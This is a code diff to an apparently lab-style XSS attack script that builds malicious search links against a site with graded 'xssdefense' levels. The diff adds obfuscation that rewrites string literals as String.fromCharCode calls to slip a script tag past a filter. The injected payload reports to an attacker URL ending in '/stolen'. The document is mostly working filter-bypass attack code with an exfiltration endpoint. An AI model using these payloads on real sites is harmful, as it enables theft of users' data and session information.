@@ -111,13 +111,47 @@ function makeLink(xssdefense, target, attacker) {
 		encodeURIComponent("<script" + ">" + payload.toString() +
 			";payload(\"" + attacker + "\");</script" + ">");
 	} else if (xssdefense == 4) {
-		var injectedCode = payload.toString() +
-			";payload(\" " + attacker + "\" );";
-
+		var code = payload.toString() +
+			";payload(\"" + attacker + "\");"
+		code = transformCode(code);
+		console.log(code)
 		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
-		encodeURIComponent("<iframe src= \'data:text/plain;base64," + btoa(injectedCode) + "\' >" + "</iframe" + ">");
+		encodeURIComponent("<script" + ">" + code + "</script" + ">");
 	}
 }
+
+function transformCode(code) {
+	var result = code;
+	var odd = false;
+	var acc = "";
+	for (var i = 0; i < code.length; i++) {
+		if (code[i] == '"') {
+			odd = !odd;
+			if (!odd) {
+				result = result.replace(acc, transformString(acc));
+				acc = ""
+			}
+		} else {
+			if (odd) {
+				acc += code[i];
+			}
+		}
+	}
+	return result;
+}
+
+function transformString(str) {
+	var result = "String.fromCharCode(";
+	for (var i = 0; i < str.length; i++) {
+		if (i == 0) {
+			result += str.charCodeAt(i)
+		} else {
+			result += "," + str.charCodeAt(i);
+		}
+	}
+	return result + ")";	
+}
+
 var xssdefense = 4;
 var target = "http://permalink.co:8080/";
 var attacker = "http://127.0.0.1:31337/stolen";
